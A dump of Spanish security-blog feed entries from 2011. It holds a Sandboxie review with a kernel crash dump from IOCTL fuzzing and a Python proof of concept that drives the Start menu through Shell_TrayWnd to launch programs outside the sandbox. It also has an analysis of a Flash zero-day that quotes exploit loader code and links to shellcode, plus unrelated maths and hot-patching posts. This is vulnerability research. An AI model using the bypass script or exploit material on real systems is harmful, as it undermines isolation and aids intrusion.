+<p><strong><span>[0x123400XX][AAAAAAAAAAAAAAAAAAAAAAA…]</span></strong></p>
+<p>Al lanzar este simple fuzzeo, cuando llega al id <strong>0&#215;12340027</strong> salta un <strong>bug check</strong>:</p>
+<h5><span>WINDBG&gt;!analyze -v<br />
+*******************************************************************************<br />
+* *<br />
+* Bugcheck Analysis *<br />
+* *<br />
+*******************************************************************************<br />
+DRIVER_CORRUPTED_MMPOOL (d0)<br />
+Arguments:<br />
+<strong>Arg1: 6b757a74, memory referenced<br />
+</strong><strong>Arg2: 00123400, IRQL<br />
+</strong><strong>Arg3: 00000000, value 0 = read operation, 1 = write operation<br />
+</strong><strong>Arg4: 12340027, address which referenced memory<br />
+</strong>An attempt was made to access a pageable (or completely invalid) address at an<br />
+interrupt request level (IRQL) that is too high. This is<br />
+caused by drivers that have corrupted the system pool. Run the driver<br />
+verifier against any new (or suspect) drivers, and if that doesn&#8217;t turn up<br />
+the culprit, then use gflags to enable special pool. You can also set<br />
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\ProtectNonPagedPool<br />
+to a DWORD 1 value and reboot. Then the system will unmap freed nonpaged pool,<br />
+preventing drivers (although not DMA-hardware) from corrupting the pool.<br />
+Debugging Details:<br />
+&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;<br />
+*************************************************************************<br />
+*** ***<br />
+*** ***<br />
+*** Your debugger is not using the correct symbols ***<br />
+*** ***<br />
+*** In order for this command to work properly, your symbol path ***<br />
+*** must point to .pdb files that have full type information. ***<br />
+*** ***<br />
+*** Certain .pdb files (such as the public OS symbols) do not ***<br />
+*** contain the required information. Contact the group that ***<br />
+*** provided you with these symbols if you need this command to ***<br />
+*** work. ***<br />
+*** ***<br />
+*** Type referenced: kernel32!pNlsUserInfo ***<br />
+*** ***<br />
+*************************************************************************<br />
+*************************************************************************<br />
+*** ***<br />
+*** ***<br />
+*** Your debugger is not using the correct symbols ***<br />
+*** ***<br />
+*** In order for this command to work properly, your symbol path ***<br />
+*** must point to .pdb files that have full type information. ***<br />
+*** ***<br />
+*** Certain .pdb files (such as the public OS symbols) do not ***<br />
+*** contain the required information. Contact the group that ***<br />
+*** provided you with these symbols if you need this command to ***<br />
+*** work. ***<br />
+*** ***<br />
+*** Type referenced: kernel32!pNlsUserInfo ***<br />
+*** ***<br />
+*************************************************************************<br />
+<strong>READ_ADDRESS: 6b757a74  (kuzt -&gt; tzuk -&gt; el nombre del autor)<br />
+</strong>CURRENT_IRQL: 123400<br />
+FAULTING_IP:<br />
++5c1952f0012c4f0<br />
+12340027 ?? ???<br />
+DEFAULT_BUCKET_ID: DRIVER_FAULT<br />
+BUGCHECK_STR: 0xD0<br />
+PROCESS_NAME: Kartoffel.exe<br />
+LAST_CONTROL_TRANSFER: from 804f7b27 to 8052716c<br />
+STACK_TEXT:<br />
+f7642750 804f7b27 00000003 f7642aac 00000000 nt!RtlpBreakWithStatusInstruction<br />
+f764279c 804f8714 00000003 c0000005 00000000 nt!KiBugCheckDebugBreak+0&#215;19<br />
+f7642b7c 804f8c3f 000000d0 6b757a74 00123400 nt!KeBugCheck2+0&#215;574<br />
+f7642b9c f7cce31f 000000d0 6b757a74 00123400 nt!KeBugCheckEx+0x1b<br />
+WARNING: Stack unwind information not available. Following frames may be wrong.<br />
+f7642c34 804ee0ef 81740340 817398a0 806d12d0 SbieDrv+0x131f<br />
+f7642c44 80574032 81739910 818b2b88 817398a0 nt!IopfCallDriver+0&#215;31<br />
+f7642c58 80574ec1 81740340 817398a0 818b2b88 nt!IopSynchronousServiceTail+0&#215;60<br />
+f7642d00 8056d81e 000007b4 00000000 00000000 nt!IopXxxControlFile+0x5e7<br />
+f7642d34 8053cbc8 000007b4 00000000 00000000 nt!NtDeviceIoControlFile+0x2a<br />
+f7642d34 7c91eb94 000007b4 00000000 00000000 nt!KiFastCallEntry+0xf8<br />
+0012eca4 7c91d8ef 7c8016be 000007b4 00000000 ntdll!KiFastSystemCallRet<br />
+0012eca8 7c8016be 000007b4 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc<br />
+0012ed08 0040617d 000007b4 00222007 003b0808 kernel32!DeviceIoControl+0&#215;78<br />
+0012fee4 0040a9cd 0000000f 003b0b40 003b0c10 Kartoffel+0x617d<br />
+0012ffc0 7c816ff7 0000001a 00000000 7ffdd000 Kartoffel+0xa9cd<br />
+0012fff0 00000000 0040a85a 00000000 78746341 kernel32!BaseProcessStart+0&#215;23<br />
+STACK_COMMAND: kb<br />
+FOLLOWUP_IP:<br />
+SbieDrv+131f<br />
+f7cce31f 8bf7 mov esi,edi<br />
+SYMBOL_STACK_INDEX: 4<br />
+SYMBOL_NAME: SbieDrv+131f<br />
+FOLLOWUP_NAME: MachineOwner<br />
+MODULE_NAME: SbieDrv<br />
+IMAGE_NAME: SbieDrv.sys<br />
+DEBUG_FLR_IMAGE_TIMESTAMP: 4d8b29aa<br />
+FAILURE_BUCKET_ID: 0xD0_SbieDrv+131f<br />
+BUCKET_ID: 0xD0_SbieDrv+131f<br />
+Followup: MachineOwner<br />
+&#8212;&#8212;&#8212;<br />
+Sorting &#8216;Functions window&#8217;&#8230; ok</span></h5>
+<p><strong>KeBugCheck es llamado por el propio SbieDrv porque detecta algo raro, así que es un simple DoS no muy peligroso. Pero que un fuzzeo tan simple nos provoque un DoS en kernel nos hace pensar que el código de SbieDrv tiene varios cabos sueltos.</strong></p>
+<p><strong><span>5.2. Envío de mensajes a </span></strong><strong><span>Shell_TrayWnd (ventana excluída por Sandboxie):</span></strong></p>
+<p>Como ya vimos en el análisis de los hooks para controles de mensajes a ventanas hay una serie de ventanas excluídas para las que se permiten algunos mensajes adicionales. Entre ellas está Shell_TrayWnd, la ventana de la barra de aplicaciones.</p>
+<p><strong>El siguiente script demuestra que estos mensajes permitidos a Shell_TrayWnd nos permiten movernos por el menú inicio y lanzar aplicaciones linkadas desde él:</strong></p>
+<p><code><br />
+<span> import random</span></code></p>
+<p><code><span> </span></code></p>
+<p><code><span>random.seed()</span></code></p>
+<p><code><span>VK_LEFT=0x25<br />
+VK_UP=0x26<br />
+VK_RIGHT=0x27<br />
+VK_DOWN=0x28<br />
+VK_RETURN=0x0d<br />
+VK_TAB=0x09<br />
+VK_SHIFT=0x10<br />
+VK_CONTROL=0x11<br />
+VK_MENU=0x12</span></code></p>
+<p><code><span> </span></code></p>
+<p><code><span>import ctypes<br />
+import time<br />
+from ctypes.wintypes import DWORD, HWND, HANDLE, LPCWSTR, WPARAM, LPARAM, RECT, POINT<br />
+trayRect=RECT(0,0,0,0)<br />
+trayWindow = ctypes.windll.user32.FindWindowExA(0,0,"Shell_TrayWnd",0)<br />
+trayNotifyWindow = ctypes.windll.user32.FindWindowExA(trayWindow,0,"TrayNotifyWnd",0)</span></code></p>
+<p><code><span> </span></code></p>
+<p><code>def PressKey(hwin,key):</code></p>
+<p><code> </code></p>
+<p><code>msgkeydown=0x100<br />
+msgkeyup=0x101<br />
+ctypes.windll.user32.PostMessageA(hwin, msgkeydown, key, 0) #KEYDOWN<br />
+time.sleep(0.1)<br />
+ctypes.windll.user32.PostMessageA(hwin, msgkeyup, key, 0) #KEYUP<br />
+time.sleep(0.1)</code></p>
+<p><code> </code></p>
+<p><code>ctypes.windll.user32.PostMessageA(trayWindow, 0xa1, 1, 0x200020) #WM_NCLBUTTONDOWN<br />
+ctypes.windll.user32.PostMessageA(trayWindow, 0xa2, 0, 0x200020) #WM_NCLBUTTONUP</code></p>
+<p><code> </code></p>
+<p><code>PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)<br />
+PressKey(trayWindow, VK_UP)</code></p>
+<p><code> </code></p>
+<p><code>PressKey(trayWindow, VK_RIGHT)<br />
+PressKey(trayWindow, VK_RIGHT)</code></p>
+<p><code> </code></p>
+<p><code>PressKey(trayWindow, VK_DOWN)<br />
+PressKey(trayWindow, VK_DOWN)<br />
+PressKey(trayWindow, VK_DOWN)<br />
+PressKey(trayWindow, VK_DOWN)<br />
+PressKey(trayWindow, VK_DOWN)<br />
+PressKey(trayWindow, VK_DOWN)</code></p>
+<p><code> </code></p>
+<p><span> </span></p>
+<p><code><span>PressKey(trayWindow, VK_RETURN)</span></code></p>
+<p><code><span> </span></code>(Las pulsaciones de teclas son las necesarias para lanzar la calculadora tal como yo tenía colocado el menú inicio cuando hice la prueba).</p>
+<p>No es un problema de seguridad grave pero pienso que tampoco es el comportamiento que espera el usuario de la sandbox.</p>
+<p><strong><span> </span></strong></p>
+<p><strong><span>5.3. Nombres largos:</span></strong></p>
+<p>Sandboxie tiene problemas con nombres de ficheros largos (más largos que MAX_PATH y hasta 32 mil y pico caracteres) porque en su callback LoadImageNotifyRoutine llega el nombre a NULL.</p>
+<p>No he visto problemas de seguridad aquí pero sí que se obtienen mensajes de error y comportamientos que sin Sandboxie no ocurrirían (tanto en procesos sandboxeados como no sandboxeados).</p>
+<p>Sin embargo este detalle nos vuelve a hacer pensar que es difícil interceptar demasiadas cosas en el sistema operativo, en puntos muy delicados, y tener en cuenta todos los posibles casos.</p>
+<p><strong><span>5.4. Parseo de formatos complejos:</span></strong></p>
+<p>En mi opinión el driver de Sandboxie <strong>tiene código bastante arriesgado en kernel.</strong></p>
+<p>Por ejemplo, en el callback LoadImageNotifyRoutine se hace un <strong>parseo a fondo de la cabecera PE de la imagen cargada</strong> en modo usuario. A continuación vemos el comienzo de dicho parseo en el que más adelante profundiza en los recursos, etc…</p>
+<p><img class="alignnone" title="parseo cabeceras" src="http://blog.48bits.com/wp-content/uploads/2011/05/parseo-cabeceras.jpg" alt="" width="931" height="741" /></p>
+<p><strong>También abre y parsea los ficheros de configuración .ini</strong> desde kernel:</p>
+<p><img class="alignnone" title="parseo ini" src="http://blog.48bits.com/wp-content/uploads/2011/05/parseo-ini.jpg" alt="" width="354" height="658" /></p>
+<p>En otros puntos <strong>desensambla instrucciones</strong> a la entrada de funciones (tanto de kernel como de modo usuario) para saber que tipo de hook debe meter y guardarse las instrucciones sobrescritas. Cuando por ejemplo se va a pinchar algo en modo usuario es el driver el que va a salvar en un buffer de usuario las instrucciones que se van a sobreescribir.</p>
+<p>En definitiva, mi opinión es que Sandboxie mete bastante código complejo y arriesgado en kernel. Ya vimos en el sencillo fuzzeo de io controles que SbieDrv deja más de un cabo suelto. No me he metido a fuzzear en profundida: ficheros ini, cabeceras pe, etc… pero tengo la impresión de que saltaría la liebre por más de un sitio.</p>
+<p><strong><span>5.5. Conclusión:</span></strong></p>
+<p><strong>En general mi opinión es que las sandbox por aislamiento de proceso llevan una inseguridad intrínseca:</strong></p>
+<p>-Es difícil interceptar todo lo peligroso a lo que puede acceder un proceso.</p>
+<p>-Se va a introducir código (los hooks) en puntos muy delicados del sistema por lo que hay que confiar mucho en ese código.</p>
+<p>-Se van a tocar cosas muy dependientes de la versión del sistema operativo para interceptar todo lo necesario.</p>
+<p>-Muchos de los hooks necesarios no van a ser muy limpios ni documentados, ni soportados por el sistema, más propios de un rootkit que de una herramienta de seguridad.</p>
+<p>-Seguramente vas a necesitar meter algunas excepciones a lo que prohibes en la sandbox para que funcionen algunas aplicaciones típicas, como hace Sandboxie.</p>
+<p>-En el caso de Sandboxie además se meten en kernel muchos bloques de código complejos que en mi opinión podrían estar en modo usuario: parseo de ficheros sandboxie.ini y templates.ini, parseo de cabeceras PE, etc…</p>
+<p>-También en el caso de Sandboxie, por su diseño, necesita exportar mucha funcionalidad compleja a través de io controles.</p>
+<p><strong>Mi conclusión respecto a Sandboxie es que es una herramienta útil en la que sí lanzaría un navegador o un pdf reader para ayudar a protegerme contra vulnerabilidades, pero si fuera a lanzar malware dentro de Sandboxie, lanzaría Sandboxie dentro de una vmware, bochs u otra máquina virtual.</strong></p>
+<p><strong><br />
+</strong></p>
+Entry date: Mon, 23 May 2011 10:50:08 +0000
+Entry date_parsed: time.struct_time(tm_year=2011, tm_mon=5, tm_mday=23, tm_hour=10, tm_min=50, tm_sec=8, tm_wday=0, tm_yday=143, tm_isdst=0)
+Epoch Seconds:  1306140608.0
+Entry id: http://blog.48bits.com/?p=1874
+
+- - - - - - - - - -
+
+Entry title: Un reloj de dos colores…
+Entry link: http://blog.48bits.com/2011/04/15/un-reloj-de-dos-colores/
+Entry content: <p><a href="http://blog.48bits.com/wp-content/uploads/2011/04/reloj-espiral.jpg"><img src="http://blog.48bits.com/wp-content/uploads/2011/04/reloj-espiral.jpg" alt="" title="reloj-espiral" width="357" height="350" class="aligncenter size-full wp-image-1834" /></a><br />
+Desde hace algunas semanas El Pais esta publicando unos retos matematicos semanales, y entre los acertantes de cada desafio se sortea la coleccion completa de libros de matematicas que el periodico esta vendiendo cada domingo. Desde mi punto de vista el acierto de estos desafios es la eleccion de problemas que son entretenidos y asequibles para el gran publico. Como ejemplo podemos analizar el problema de la semana pasada. Podeis ver el video del desafio <a href="http://www.elpais.com/videos/sociedad/reloj/colores/elpepusoc/20110407elpepusoc_1/Ves/">aqui</a>.<br />
+<span id="more-1830"></span><br />
+Comencemos poniendo una esfera ejemplo con sus numeros coloreados de azul y rojo. Tened en cuenta que esta esfera sirve solo como ejemplo, y que nosotros debemos demostrar que nuestro sistema funciona para cualquier esfera, incluida esta. </p>
+<p><a href="http://blog.48bits.com/wp-content/uploads/2011/04/reloj.jpg"><img src="http://blog.48bits.com/wp-content/uploads/2011/04/reloj.jpg" alt="" title="reloj" width="350" height="350" class="aligncenter size-full wp-image-1834" /></a></p>
+<p>Si analizamos el problema proupesto, vemos que no se trata de un problema dificil. A continuacion voy a exponer una posible solucion. Tenemos que demostrar que siempre se puede dibujar una linea que corte al reloj en dos y que deje tres numeros rojos y tres numeros azules a cada lado. Nosotros vamos a demostrar que esto es asi, y ademas vamos a proponer un mecanismo que nos permitira saber cuantas soluciones existen y cuales son. </p>
+<p>Vamos a comenzar imaginandonos que dibujamos una linea uniendo cada uno de los numeros de la esfera del reloj con el numero que tiene en frente. Todas estas lineas, seis en total, se cruzaran en el centro.<br />
+<a href="http://blog.48bits.com/wp-content/uploads/2011/04/reloj_lineas.jpg"><img src="http://blog.48bits.com/wp-content/uploads/2011/04/reloj_lineas.jpg" alt="" title="reloj_lineas" width="350" height="350" class="aligncenter size-full wp-image-1833" /></a><br />
+El primer dato que hemos de tener en cuenta es que para cada una de estas parejas, (12,6),(1,7),(2,8), etc. los dos numeros de la pareja no pueden pertenecer al mismo lado de la solucion. Esto es asi porque todas las lineas que hemos dibujado se cruzan en el centro, y la linea solucion se cruzara con todas ellas tambien en el centro del reloj, dejando siempre un numero de la pareja a un lado, y el segundo al otro.<br />
+Ahora, imaginemos que para todas estas parejas, ambos numeros tienen el mismo color. Entonces, cualquiera de las rectas que cruzando por el centro de la esfera divide el reloj en dos partes con seis numeros cada una, es una solucion del problema. Esto debe ser asi porque si para cada pareja un numero esta en un lado de la solucion y el otro esta en el otro lado de la solucion, y todas las parejas tiene los dos numeros del mismo color, entonces tenemos que encontrar necesariamente el mismo numero de digitos de cada color a ambos lados de cualquier recta que divide al realoj en dos.<br />
+De todo esto deducimos una cosa importante.  Podemos ignorar las parejas que tienen los dos numeros del mismo color. Dibujemos nuestro reloj, dejando solo las rectas que representan parejas con numeros de diferentes colores:</p>
+<p><a href="http://blog.48bits.com/wp-content/uploads/2011/04/reloj_lineas2.jpg"><img src="http://blog.48bits.com/wp-content/uploads/2011/04/reloj_lineas2.jpg" alt="" title="reloj_lineas2" width="350" height="350" class="aligncenter size-full wp-image-1835" /></a></p>
+<p>Ahora, pasaremos a demostrar otro detalle que es importante para llegar a la solución final. El numero de parejas con numeros de diferentes colores es siempre un numero par. Lo podemos demostrar facilmente por reduccion al absurdo. Imaginemos que existe un numero impar de parejas con numeros de diferentes color, y sea este numero k, e imaginemos que para uno de los dos colores, por ejemplo el rojo, existen n parejas con los dos numeros de colo rojo. Entonces, la cantidad de numeros rojos en la esfera debe ser: 2*n+k. Como k es impar, ese numero es impar, pero la cantidad de numeros rojos y azules en la esfera es par : 6. Por lo tanto es imposible que haya un numero impar de parejas con numeros de diferente color.</p>
+<p>Ahora ya tenemos todas las piezas del puzzle. Las parejas con ambos numeros de igual color no crean desequilibrio entre las dos partes de la solucion y siempre hay un numero par de parejas con numeros de diferente color. Si elegimos un color, por ejemplo el rojo, y nos fijamos donde estan los numeros de cojor rojo de las parejas  con numeros de diferente color, siempre podemos encontrar uno o varios puntos en el que dejamos la misma cantidad de numeros rojos a un lado y otro. La paridad de parejas nos garantiza la existencia de este punto. De esta forma garantizamos que la cantidad de numeros de color rojo, y por ende de color azul, a ambos lados de la solucion coinciden. Pero ademas de demostrar que siempre hay solucion, y de haber encontrado una, tambien hemos diseñado un mecanismo que nos permite saber cuantas soluciones hay y cuales son. Para el ejemplo con el que hemos empezado, existen varias soluciones. He marcado con un circulo los numeros que limitan la zona donde encontramos soluciones.</p>
+<p><a href="http://blog.48bits.com/wp-content/uploads/2011/04/soluciones.jpg"><img src="http://blog.48bits.com/wp-content/uploads/2011/04/soluciones.jpg" alt="" title="soluciones" width="350" height="350" class="aligncenter size-full wp-image-1836" /></a></p>
+<p>Como podeis ver, los problemas son asequibles y entretenidos. Asi que os animo a seguir estos retos matematicos. El de esta semana es mas sencillo que el de la semana pasada ;o)<br />
+Por cierto, si quereis ver otras soluciones, El Pais ha publicando algunas de ellas <a href="http://www.elpais.com/articulo/sociedad/Siempre/hay/recta/cualquier/reloj/elpepusoc/20110412elpepusoc_11/Tes">aqui</a>.</p>
+Entry date: Fri, 15 Apr 2011 20:14:57 +0000
+Entry date_parsed: time.struct_time(tm_year=2011, tm_mon=4, tm_mday=15, tm_hour=20, tm_min=14, tm_sec=57, tm_wday=4, tm_yday=105, tm_isdst=0)
+Epoch Seconds:  1302891297.0
+Entry id: http://blog.48bits.com/?p=1830
+
+- - - - - - - - - -
+
+Entry title: Chinos, exploits y cintas de lomo
+Entry link: http://blog.48bits.com/2011/04/14/chinos-exploits-y-cintas-de-lomo/
+Entry content: <p>Hola</p>
+<p>Puede que a algunos no les suene ese &#8220;Hola&#8221;, es una interjección muy habitual en castellano. El sonido todavía no ha sido gravado por la SGAE ni por hacienda, asi que es gratis emitirlo por cualquier medio. Pongamos un ejemplo.</p>
+<p>Marisa sale cada mañana hacia el trabajo y se encuentra con Carlos en el portal. Marisa,que es una persona educada, dice &#8220;Hola, buenos días&#8221; y Carlos ignora la interjección.  Días más tarde, Marisa (¿hemos dicho que era de Anonymous?) sube a 4chan un flyer de la operación &#8220;HelloWorld&#8221;. En cuestión de 1 mes Carlos pierde su trabajo, a su mujer, su hija se hace choni, le suben la hipoteca y es obligado a  dimitir como presidente de la comunidad. Todo por no decir hola. ¿Te arriesgarías a seguir siendo un maleducado? Yo no. Di hola hijo de puta o págalo caro.<br />
+<img src="http://blog.48bits.com/wp-content/uploads/2011/04/helloworld.png" alt="" title="helloworld" width="600" height="374" class="aligncenter size-full wp-image-1819" /></p>
+<p>Ahora vamos a ver cómo se dice &#8220;hola&#8221; en cyberchino&#8230;<br />
+<span id="more-1818"></span></p>
+<p>Hace unos días Brian Krebs destapó la liebre, un nuevo <a href="http://krebsonsecurity.com/2011/04/new-adobe-flash-zero-day-being-exploited/">0day</a> en flash estaba siendo explotado en ataques muy dirigidos.<br />
+A partir de ahí la cosa ya se empezó a mover y Adobe <a href="http://www.adobe.com/support/security/advisories/apsa11-02.html">confirmaba</a> la situación.</p>
+<p>En el <a href="http://contagiodump.blogspot.com/">blog</a> de referencia sobre ataques dirigidos empezaba a brotar la <a href="http://contagiodump.blogspot.com/2011/04/apr-8-cve-2011-0611-flash-player-zero.html">info</a>, y al poco tiempo ya nos podíamos bajar los samples (en un zip con contraseña).</p>
+<p>A través de correos, se había enviado el exploit embebido en documentos de word.</p>
+<p>¿Y qué pasa cuando los abres?. Por si alguna vez te lo has preguntado, echa un vistazo al siguiente video donde ejecuto el .DOC real que contiene el exploit. Esto es lo que vería el objetivo del ataque.</p>
+<p></p>
+<p>Básicamente lo que tenemos es la siguiente secuencia, que se repite en este tipo de ataques.:</p>
+<p>1. Se carga el documento con el exploit embebido<br />
+2. Se ejecuta el exploit y el payload<br />
+3. Se mata la instancia actual del Word<br />
+4. Se abre otra rápidamente con un documento &#8220;limpio&#8221; para que la víctima no sospeche.</p>
+<p>Al ejecutarse en una VM vemos que pasa demasiado tiempo entre las diferentes etapas, pero en una física, aunque todavía perceptible, se reduciría algo más.</p>
+<p>Veamos que tiene dentro el documento, usando el programa FileInsight de McAfee<br />
+<img src="http://blog.48bits.com/wp-content/uploads/2011/04/filein1.png" alt="" title="filein1" width="800" height="324" class="aligncenter size-full wp-image-1825" /></p>
+<p>Vemos en esta imagen como el documento lleva embebido un objeto flash, que es el que hace todo el &#8220;trabajo&#8221;. En este caso, ubicar en memoria el nop sled y la shellcode mediante heap spray.</p>
+<p>El decompilado del .swf original lo podeís ver <a href="http://bit.ly/fQ3zwK" target="_Blank">aquí</a></p>
+<p>Si os fijais en la linea 61 vereis lo siguiente</p>
+<p><code>this.t = "4657530ACC0500007800055F00000FA000001801004.... [bugly swf]....";</code></p>
+<p>Un cadena que representa los bytes de otro archivo flash, que es el encargado de provocar la vulnerabilidad.<br />
+Este trigger es cargado sin necesidad de pasar por disco usando el metodo loadBytes del loader </p>
+<p>          <code>  this.r = this.hexToBin(this.t);<br />
+            this.ldr = new flash.display.Loader();<br />
+            this.ldr.loadBytes(this.r);</code></p>
+<p>El exploit no tiene mucho, no se salta ni DEP ni ASLR por lo que parece que estaba destinado a XP principalmente.</p>
+<p>Si quereis echar un ojo a la shellcode la he subido aquí <a href="http://www.filefactory.com/file/cbb6273/n/shellcode.bin">http://www.filefactory.com/file/cbb6273/n/shellcode.bin</a></p>
+<p>Podéis leer un buen análisis de la lógica del fallo que ha hecho la gente de secunia<br />
+<a href="http://secunia.com/blog/210">http://secunia.com/blog/210</a></p>
+<p>También os recomiendo, si queréis profundizar en este tipo de fallos, las siguientes slides <a href="http://cansecwest.com/csw11/Flash_ActionScript.ppt">http://cansecwest.com/csw11/Flash_ActionScript.ppt</a></p>
+<p>Otra referencia con una curiosidad al final <img src="http://blog.48bits.com/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" /><br />
+<a href="http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html">http://bugix-security.blogspot.com/2011/04/cve-2011-0611-adobe-flash-zero-day.html</a></p>
+<p>Hasta la próxima.</p>
+Entry date: Thu, 14 Apr 2011 20:50:04 +0000
+Entry date_parsed: time.struct_time(tm_year=2011, tm_mon=4, tm_mday=14, tm_hour=20, tm_min=50, tm_sec=4, tm_wday=3, tm_yday=104, tm_isdst=0)
+Epoch Seconds:  1302807004.0
+Entry id: http://blog.48bits.com/?p=1818
+
+- - - - - - - - - -
+
+Entry title: WINDOWS RED HOT CHILI PATCHING
+Entry link: http://blog.48bits.com/2011/03/14/windows-red-hot-chili-patching/
+Entry content: <p>Hace tiempo que leí sobre la manera en que habían abordado en el sistema operativo windows algunos de los problemas  que nos podemos encontrar al desarrollar un sistema con el requisito de que permita actualizar sus componentes en  caliente.</p>
+<p>Desarrollar un sistema que cumpla con dicho requisito puede resultar bastante interesante y además bastante  complicado dependiendo de la complejidad del propio sistema a actualizar. Me parece interesante como lo resuelven en  Windows así que me he decidió a aprovechar un rato tonto para escribir sobre algunos trucos que han utilizado en  dicho sistema operativo.</p>
+<p>No voy a contar nada nuevo, pero como lo que voy a contar trata de promover un poco la culturilla general, lo he  publicado en una nueva sección que le viene al pelo a dicho propósito.</p>
+<p><span id="more-1799"></span></p>
+<p>El caso es que tenemos un modulo que exporta funciones mapeado en memoria y literalmente cientos de hilos invocando  a dichas funciones. En un momento dado queremos actualizar una de las funciones sin que ningún hilo se entere  absolutamente de nada. ¿Como lo hacemos?</p>
+<p>Una respuesta sencilla puede ser: mapeamos código con lo que sería la función actualizada en una nueva posición de memoria y  redirigimos el código de la función &#8220;vieja&#8221; a esa nueva función con un “far jmp”. Pillamos como ejemplo una función  cualquiera de la ntoskrnl como &#8220;ExAcquireResourceExclusiveLite&#8221;, la típica función que no vale para nada:</p>
+<div class="dean_ch">
+<p>.text:0040339F <span class="nu0">90</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">nop</span><br />
+.text:004033A0 <span class="nu0">90</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">nop</span><br />
+.text:004033A1 <span class="nu0">90</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">nop</span><br />
+.text:004033A2 <span class="nu0">90</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">nop</span><br />
+.text:004033A3 <span class="nu0">90</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">nop</span></p>
+<p>ExAcquireResourceExclusiveLite:</p>
+<p>.text:004033A4 8B FF &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="kw1">mov</span> &nbsp; &nbsp; <span class="kw3">edi</span>, <span class="kw3">edi</span><br />
+.text:004033A6 <span class="nu0">55</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">ebp</span><br />
+.text:004033A7 8B EC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="kw1">mov</span> &nbsp; &nbsp; <span class="kw3">ebp</span>, <span class="kw3">esp</span><br />
+.text:004033A9 <span class="nu0">83</span> EC 0C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">sub</span> &nbsp; &nbsp; <span class="kw3">esp</span>, <span class="re0">0Ch</span><br />
+.text:004033AC <span class="nu0">53</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">ebx</span><br />
+.text:004033AD <span class="nu0">56</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">esi</span><br />
+.text:004033AE <span class="nu0">57</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">push</span> &nbsp; &nbsp;<span class="kw3">edi</span><br />
+&nbsp;</div>
+<p>Si queremos parchear esta función metiéndole un &#8220;far jmp&#8221;, tendremos que escribir 5 bytes machacando el prologo de  la misma (es decir las 3 primeras instrucciones). Aquí nos encontramos con el primer problema de sincronía: en una  arquitectura de 32 bits no podremos escribir los 5 bytes de forma atómica, a no ser que lo hagamos con &#8220;lock  cmpxchg8b&#8221; o similar que podría no estar disponible en todas las arquitecturas. Al menos necesitaremos dos  operaciones para hacerlo y por lo tanto entre que nuestro hilo escribe los primeros 4 bytes del &#8220;far jmp&#8221; (primera  operación) y escribe el último byte (segunda operación) podría pasar a ejecutarse otro hilo habiendo quedado nuestro  parcheo a medias. Si al nuevo hilo o cualquier otro que se ejecute a continuación antes de que terminemos el parcheo  se le ocurre invocar a la función &#8220;ExAcquireResourceExclusiveLite&#8221;, estaremos bien jodidos. Así que menos mal que<br />
+&#8220;ExAcquireResourceExclusiveLite&#8221; no vale para nada y nadie la usa&#8230;</p>
